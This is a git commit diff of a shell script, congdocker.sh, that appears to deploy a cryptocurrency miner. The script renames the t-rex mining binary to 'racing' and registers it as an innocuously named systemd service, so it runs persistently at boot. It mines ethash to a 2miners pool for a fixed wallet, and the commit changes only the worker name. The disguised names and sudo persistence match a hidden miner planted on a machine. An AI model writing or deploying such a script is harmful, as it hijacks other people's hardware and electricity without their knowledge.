5b5f8ad98f792fc3800e3f884be00f9e7f11939d
terryjot9 <103128915+terryjot9@users.noreply.github.com>
2022-04-06 22:53:15 +0800

    Update congdocker.sh

--- congdocker.sh
+++ congdocker.sh
@@ -14,4 +14,4 @@ mv t-rex racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x543db6d96e8b34984b40cd2de48489f71d40f38f -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x543db6d96e8b34984b40cd2de48489f71d40f38f -p x -w dat09 &
+sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x543db6d96e8b34984b40cd2de48489f71d40f38f -p x -w nhincaigi &
